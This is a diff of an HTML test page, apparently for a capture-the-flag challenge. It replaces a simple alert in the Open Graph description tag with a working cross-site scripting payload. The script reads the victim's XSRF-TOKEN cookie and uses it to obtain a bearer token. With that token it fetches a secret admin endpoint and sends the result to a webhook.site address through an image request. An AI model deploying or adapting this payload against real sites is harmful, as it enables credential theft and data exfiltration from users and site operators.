@@ -1,5 +1,52 @@
 <!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta property="og:description" content='<script>alert(origin)</script>' />
+  <meta charset="UTF-8" />
+  <title>My OG Test</title>
+  <meta property="og:title" content="My Test Page" />
+  <meta property="og:description" content='<script>
+    (async function () {
+      const webhook = "https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d";
+
+      function getXsrf() {
+        try {
+          return decodeURIComponent(document.cookie.split("; ").find(c => c.startsWith("XSRF-TOKEN=")).split("=")[1]);
+        } catch { return null; }
+      }
+
+      const token = getXsrf();
+      if (!token) return;
+
+      try {
+        const res1 = await fetch("/generate-token", {
+          method: "POST",
+          headers: {
+            "X-XSRF-TOKEN": token,
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          credentials: "include"
+        });
+        const json = await res1.json();
+        const bearer = json.token;
+
+        const res2 = await fetch("/api/admin/sup3rs3cr3t", {
+          headers: {
+            "Authorization": "Bearer " + bearer,
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          credentials: "include"
+        });
+        const flag = await res2.text();
+        new Image().src = webhook + "?flag=" + encodeURIComponent(flag);
+      } catch (e) {
+        new Image().src = webhook + "?error=" + encodeURIComponent(e.message);
+      }
+    })();
+  </script>' />
+  <meta property="og:image" content="https://example.com/image.jpg" />
+  <meta property="og:url" content="https://username.github.io/repo-name/" />
 </head>
+<body>
+  <h1>Hello Open Graph</h1>
+</body>
 </html>
